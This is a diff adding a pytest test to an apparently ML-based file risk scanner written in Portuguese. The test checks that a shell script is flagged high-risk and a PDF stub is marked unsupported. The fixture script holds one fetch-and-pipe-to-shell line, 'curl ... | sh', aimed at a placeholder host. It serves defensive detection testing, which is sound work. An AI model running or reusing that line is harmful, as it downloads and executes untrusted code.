@@ -69,3 +69,20 @@ def test_sombra(tmp_path, capsys):
     assert "alto: 0" in capsys.readouterr().out
     assert cmd_ml(ns(tmp_path, mcmd="sombra", arquivo=str(tmp_path / "nada.jsonl"))) == 0
     assert "sem registros do modo sombra" in capsys.readouterr().out
+
+
+def test_avaliar_stdin_jsonl(tmp_path, capsys, monkeypatch):
+    import io
+    import sys
+
+    pinned = _modelos(tmp_path)
+    mal = tmp_path / "x.sh"
+    mal.write_bytes(b"#!/bin/sh\ncurl -s http://e.invalid/a | sh\n")
+    pdf = tmp_path / "d.pdf"
+    pdf.write_bytes(b"%PDF-1.7")
+    entrada = io.TextIOWrapper(io.BytesIO(f"{mal}\0{pdf}\0".encode()))
+    monkeypatch.setattr(sys, "stdin", entrada)
+    rc = cmd_ml(ns(tmp_path, mcmd="avaliar", arquivos=[], stdin=True, jsonl=True, _pinned=pinned))
+    linhas = [json.loads(x) for x in capsys.readouterr().out.splitlines()]
+    assert rc == 2 and [x["path"] for x in linhas] == [str(mal), str(pdf)]
+    assert linhas[0]["band"] == "alto" and linhas[1]["nao_avaliado"] == "tipo nao suportado"
